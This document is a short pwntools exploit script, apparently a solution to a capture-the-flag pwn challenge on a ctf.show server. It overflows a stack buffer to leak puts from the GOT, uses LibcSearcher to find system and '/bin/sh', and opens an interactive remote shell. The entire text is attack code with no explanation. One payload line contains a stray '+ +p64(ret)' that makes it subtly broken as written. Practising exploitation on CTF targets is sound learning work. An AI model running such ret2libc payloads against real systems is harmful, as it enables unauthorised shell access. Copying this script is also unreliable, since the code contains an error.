







```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28311)
elf = ELF('./pwn127')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
poprdi = 0x400803
payload = cyclic(0x80 + 0x8) + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)
r.sendline(payload)
puts = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))

ret = 0x4004fe
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x80 + 0x8) + p64(poprdi) + p64(binsh) + +p64(ret) + p64(system)
r.sendline(payload)
r.interactive()
```

